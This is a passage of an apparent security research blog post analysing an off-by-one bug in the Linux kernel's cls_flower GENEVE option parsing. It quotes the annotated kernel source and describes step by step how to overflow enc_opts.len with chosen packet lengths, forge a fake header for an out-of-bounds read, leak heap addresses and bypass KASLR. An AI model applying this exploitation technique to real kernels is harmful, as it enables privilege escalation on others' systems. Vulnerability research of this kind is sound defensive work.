style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">{\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> nlattr \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#FFAB70\">tb\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[TCA_FLOWER_KEY_ENC_OPT_GENEVE_MAX \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">];\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> nlattr \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">class \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> NULL\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">type \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> NULL\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">data \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> NULL\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tstruct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> geneve_opt \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">opt;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tint\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> err, data_len \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (option_len \u003C/span>\u003Cspan style=\"color:#F97583\">>\u003C/span>\u003Cspan style=\"color:#F97583\"> sizeof\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> geneve_opt))\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\tdata_len \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> option_len \u003C/span>\u003Cspan style=\"color:#F97583\">-\u003C/span>\u003Cspan style=\"color:#F97583\"> sizeof\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> geneve_opt);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\topt \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> geneve_opt \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;\u003C/span>\u003Cspan style=\"color:#E1E4E8\">key->enc_opts.data[key->enc_opts.len];\t\u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;---\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">\tmemset\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(opt, \u003C/span>\u003Cspan style=\"color:#F97583\">0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">ff\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, option_len);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\topt->length \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> data_len \u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 4\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\topt->r1 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\topt->r2 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\topt->r3 \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">\t/* If no mask has been prodived we assume an exact match. */\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">!\u003C/span>\u003Cspan style=\"color:#E1E4E8\">depth)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\treturn\u003C/span>\u003Cspan style=\"color:#F97583\"> sizeof\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> geneve_opt) \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> data_len;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#B392F0\">nla_type\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(nla) \u003C/span>\u003Cspan style=\"color:#F97583\">!=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> TCA_FLOWER_KEY_ENC_OPTS_GENEVE) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">\t\tNL_SET_ERR_MSG\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(extack, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"Non-geneve option type for mask\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\treturn\u003C/span>\u003Cspan style=\"color:#F97583\"> -\u003C/span>\u003Cspan style=\"color:#E1E4E8\">EINVAL;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\terr \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> nla_parse_nested_deprecated\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(tb,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\t\t  TCA_FLOWER_KEY_ENC_OPT_GENEVE_MAX,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t\t\t\t  nla, geneve_opt_policy, extack);\t\t\t\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;---\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"color:#79B8FF\">2\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (err \u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\treturn\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> err;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">\t/* We are not allowed to omit any of CLASS, TYPE or DATA\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">\t * fields from the key.\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">\t */\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#F97583\">!\u003C/span>\u003Cspan style=\"color:#E1E4E8\">option_len \u003C/span>\u003Cspan style=\"color:#F97583\">&#x26;&#x26;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t    (\u003C/span>\u003Cspan style=\"color:#F97583\">!\u003C/span>\u003Cspan style=\"color:#FFAB70\">tb\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[TCA_FLOWER_KEY_ENC_OPT_GENEVE_CLASS] \u003C/span>\u003Cspan style=\"color:#F97583\">||\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t     !\u003C/span>\u003Cspan style=\"color:#FFAB70\">tb\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[TCA_FLOWER_KEY_ENC_OPT_GENEVE_TYPE] \u003C/span>\u003Cspan style=\"color:#F97583\">||\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t     !\u003C/span>\u003Cspan style=\"color:#FFAB70\">tb\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[TCA_FLOWER_KEY_ENC_OPT_GENEVE_DATA])) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">\t\tNL_SET_ERR_MSG\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(extack, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"Missing tunnel key geneve option class, type or data\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\treturn\u003C/span>\u003Cspan style=\"color:#F97583\"> -\u003C/span>\u003Cspan style=\"color:#E1E4E8\">EINVAL;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">\t/* Omitting any of CLASS, TYPE or DATA fields is allowed\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">\t * for the mask.\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">\t */\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#FFAB70\">tb\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[TCA_FLOWER_KEY_ENC_OPT_GENEVE_DATA]) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\tint\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> new_len \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> key->enc_opts.len;\t\t\t\t\t\t\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;---\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"color:#79B8FF\">3\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\tdata \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#FFAB70\"> tb\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[TCA_FLOWER_KEY_ENC_OPT_GENEVE_DATA];\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\tdata_len \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> nla_len\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(data);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (data_len \u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 4\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\t\t\t\t\t\t\t\t\t\t\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;---\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"color:#79B8FF\">4\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">\t\t\tNL_SET_ERR_MSG\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(extack, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"Tunnel key geneve option data is less than 4 bytes long\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\treturn\u003C/span>\u003Cspan style=\"color:#F97583\"> -\u003C/span>\u003Cspan style=\"color:#E1E4E8\">ERANGE;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (data_len \u003C/span>\u003Cspan style=\"color:#F97583\">%\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 4\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) {\t\t\t\t\t\t\t\t\t\t\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;---\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"color:#79B8FF\">5\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">\t\t\tNL_SET_ERR_MSG\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(extack, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"Tunnel key geneve option data is not a multiple of 4 bytes long\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\treturn\u003C/span>\u003Cspan style=\"color:#F97583\"> -\u003C/span>\u003Cspan style=\"color:#E1E4E8\">ERANGE;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\tnew_len \u003C/span>\u003Cspan style=\"color:#F97583\">+=\u003C/span>\u003Cspan style=\"color:#F97583\"> sizeof\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> geneve_opt) \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> data_len;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">\t\tBUILD_BUG_ON\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(FLOW_DIS_TUN_OPTS_MAX \u003C/span>\u003Cspan style=\"color:#F97583\">!=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> IP_TUNNEL_OPTS_MAX);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (new_len \u003C/span>\u003Cspan style=\"color:#F97583\">>\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> FLOW_DIS_TUN_OPTS_MAX) {\t\t\t\t\t\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;---\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"color:#79B8FF\">6\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">\t\t\tNL_SET_ERR_MSG\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(extack, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"Tunnel options exceeds max size\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t\treturn\u003C/span>\u003Cspan style=\"color:#F97583\"> -\u003C/span>\u003Cspan style=\"color:#E1E4E8\">ERANGE;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\topt->length \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> data_len \u003C/span>\u003Cspan style=\"color:#F97583\">/\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 4\u003C/span>\u003Cspan style=\"color:#E1E4E8\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#B392F0\">\t\tmemcpy\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(opt->opt_data, \u003C/span>\u003Cspan style=\"color:#B392F0\">nla_data\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(data), data_len);\t\t\t\t\u003C/span>\u003Cspan style=\"color:#F97583\">&#x3C;---\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"color:#79B8FF\">7\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#FFAB70\">tb\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[TCA_FLOWER_KEY_ENC_OPT_GENEVE_CLASS]) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\tclass \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#FFAB70\"> tb\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[TCA_FLOWER_KEY_ENC_OPT_GENEVE_CLASS];\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\topt->opt_class \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> nla_get_be16\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(class);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\tif\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#FFAB70\">tb\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[TCA_FLOWER_KEY_ENC_OPT_GENEVE_TYPE]) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\ttype \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#FFAB70\"> tb\u003C/span>\u003Cspan style=\"color:#E1E4E8\">[TCA_FLOWER_KEY_ENC_OPT_GENEVE_TYPE];\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\topt->type \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#B392F0\"> nla_get_u8\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(type);\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\treturn\u003C/span>\u003Cspan style=\"color:#F97583\"> sizeof\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> geneve_opt) \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> data_len;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">}\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Triggering the off-by-one requires passing in two or more data packets, with their combined lengths totaling exactly 252 bytes. Using the 4-byte initialization to overwrite \u003Ccode>key->enc_opts.len\u003C/code> allows us to bypass checks [4], [5], and [6]. Due to the checks, the value of \u003Ccode>key->enc_opts.len\u003C/code> can never exceed 255 after a successful \u003Ccode>memcpy\u003C/code>. However, if we need to perform out-of-bounds reads using \u003Ccode>fl_dump_key_geneve_opt\u003C/code>, we must do so under the condition specified at [20], which appears somewhat tricky.\u003C/p>\n\u003Cp>However, if we break out of the cycle of overwriting \u003Ccode>key->enc_opts.len\u003C/code> to bypass detection and perform out-of-bounds access, we should consider another functionality of \u003Ccode>key->enc_opts.len\u003C/code>: locating the position of the array for incoming data packets. The length of each packet header we pass in is also in this array, upon which \u003Ccode>fl_dump_key_geneve_opt\u003C/code> relies for each data read. Since weve reset \u003Ccode>key->enc_opts.len\u003C/code> to a value less than 128, we can refill the array and modify \u003Ccode>opt->length\u003C/code>.\u003C/p>\n\u003Cp>Lets examine this scenario.\u003C/p>\n\u003Cp>\u003Cimg __ASTRO_IMAGE_=\"{&#x22;src&#x22;:&#x22;../../assets/blog_img/2024-04-15/2.png&#x22;,&#x22;alt&#x22;:&#x22;2&#x22;,&#x22;index&#x22;:0}\">\u003C/p>\n\u003Cp>First, we pass in two data packets, as shown in the diagram above, with a total length of exactly 252 bytes, leaving 3 bytes remaining in the array. Then, we pass in another data packet, causing an overflow of 1 byte into \u003Ccode>key->enc_opts.len\u003C/code>.\u003C/p>\n\u003Cp>\u003Cimg __ASTRO_IMAGE_=\"{&#x22;src&#x22;:&#x22;../../assets/blog_img/2024-04-15/3.png&#x22;,&#x22;alt&#x22;:&#x22;3&#x22;,&#x22;index&#x22;:0}\">\u003C/p>\n\u003Cp>At this point, we pass in another data packet. Referring back to the \u003Ccode>geneve_opt\u003C/code> structure, we know that the \u003Ccode>length\u003C/code>, \u003Ccode>r3\u003C/code>, \u003Ccode>r2\u003C/code>, and \u003Ccode>r1\u003C/code> fields together form the \u003Ccode>key->enc_opts.len\u003C/code> byte. However, the \u003Ccode>length\u003C/code> field will be assigned the value of the data packet length divided by 4. Therefore, if we overflow with a data packet of 96 bytes in length, \u003Ccode>key->enc_opts.len\u003C/code> will precisely points to the end of the orange section.\u003C/p>\n\u003Cp>\u003Cimg __ASTRO_IMAGE_=\"{&#x22;src&#x22;:&#x22;../../assets/blog_img/2024-04-15/4.png&#x22;,&#x22;alt&#x22;:&#x22;4&#x22;,&#x22;index&#x22;:0}\">\u003C/p>\n\u003Cp>Finally, we pass in another data packet, continuously overwriting until the last 252 bytes. With this data packet, we modify the length of the header of the first 120-byte blue packet passed in initially, making it point to a fake head, and forge the fake head in the last four bytes.\u003C/p>\n\u003Cp>Due to the nature of the \u003Ccode>fl_dump_key_geneve_opt\u003C/code> function, as our fake head falls within the length range of \u003Ccode>key->enc_opts.len\u003C/code>, it will read the length of the fake heads data packet, resulting in an out-of-bounds read of 128 bytes.\u003C/p>\n\u003Cp>With the out-of-bounds read, the \u003Ccode>chain\u003C/code> in the \u003Ccode>struct fl_flow_tmplt\u003C/code> structure serves as our target for heap leakage. In addition to the heap address, we also need function addresses to bypass KASLR protection.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">static\u003C/span>\u003Cspan style=\"color:#F97583\"> int\u003C/span>\u003Cspan style=\"color:#B392F0\"> fl_change\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> net \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#FFAB70\">net\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> sk_buff \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#FFAB70\">in_skb\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t     struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> tcf_proto \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#FFAB70\">tp\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">unsigned\u003C/span>\u003Cspan style=\"color:#F97583\"> long\u003C/span>\u003Cspan style=\"color:#FFAB70\"> base\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">\t\t     u32 \u003C/span>\u003Cspan style=\"color:#FFAB70\">handle\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#F97583\">struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> nlattr \u003C/span>\u003Cspan style=\"color:#F97583\">**\u003C/span>\u003Cspan style=\"color:#FFAB70\">tca\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t     void\u003C/span>\u003Cspan style=\"color:#F97583\"> **\u003C/span>\u003Cspan style=\"color:#FFAB70\">arg\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, u32 \u003C/span>\u003Cspan style=\"color:#FFAB70\">flags\u003C/span>\u003Cspan style=\"color:#E1E4E8\">,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">\t\t     struct\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> netlink_ext_ack \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#FFAB70\">extack\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">{\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan 